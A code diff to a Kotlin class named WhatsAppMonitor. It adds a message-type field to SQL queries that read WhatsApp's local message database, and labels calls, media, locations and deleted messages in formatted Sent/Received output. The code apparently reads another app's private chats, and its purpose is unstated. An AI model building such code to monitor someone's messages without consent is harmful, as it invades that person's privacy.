@@ -120,7 +120,7 @@ class WhatsAppMonitor(
         // Modern schema with jid_map (LID resolution)
         const val MODERN_QUERY = """
             SELECT
-                m._id, m.timestamp, m.from_me, m.text_data,
+                m._id, m.timestamp, m.from_me, m.text_data, m.message_type,
                 COALESCE(mapped_cj.raw_string, cj.raw_string) AS chat_jid,
                 COALESCE(mapped_sj.raw_string, sj.raw_string) AS sender_jid
             FROM message m
@@ -138,7 +138,7 @@ class WhatsAppMonitor(
         // Legacy schema without jid_map table
         const val LEGACY_QUERY = """
             SELECT
-                m._id, m.timestamp, m.from_me, m.text_data,
+                m._id, m.timestamp, m.from_me, m.text_data, m.message_type,
                 cj.raw_string AS chat_jid,
                 sj.raw_string AS sender_jid
             FROM message m
@@ -487,6 +487,7 @@ class WhatsAppMonitor(
         val timestamp: Long,
         val fromMe: Int,
         val textData: String?,
+        val messageType: Int,
         val chatJid: String?,
         val senderJid: String?
     )
@@ -522,6 +523,7 @@ class WhatsAppMonitor(
                         timestamp = c.getLong(c.getColumnIndexOrThrow("timestamp")),
                         fromMe = c.getInt(c.getColumnIndexOrThrow("from_me")),
                         textData = c.getString(c.getColumnIndexOrThrow("text_data")),
+                        messageType = c.getInt(c.getColumnIndexOrThrow("message_type")),
                         chatJid = c.getString(c.getColumnIndexOrThrow("chat_jid")),
                         senderJid = c.getString(c.getColumnIndexOrThrow("sender_jid"))
                     )
@@ -539,7 +541,21 @@ class WhatsAppMonitor(
 
     private fun formatOutputMessage(row: MessageRow): String {
         val direction = if (row.fromMe == 1) "Sent" else "Received"
-        val msg = if (row.textData.isNullOrBlank()) "[Non-text message / Media]" else row.textData
+        val msg = if (row.textData.isNullOrBlank()) {
+            when (row.messageType) {
+                8, 10, 90 -> "[📞 WhatsApp Call]"
+                1 -> "[🖼️ Image Media]"
+                2 -> "[🎵 Audio Media]"
+                3 -> "[🎥 Video Media]"
+                4 -> "[👤 Contact Card]"
+                5 -> "[📍 Location]"
+                9 -> "[📄 Document / File]"
+                15 -> "[🗑️ Deleted Message]"
+                else -> "[Non-text message / Media]"
+            }
+        } else {
+            row.textData
+        }
         val timeFormatted = formatTime12Hr(row.timestamp)
 
         val chatParsed = parseJid(row.chatJid)
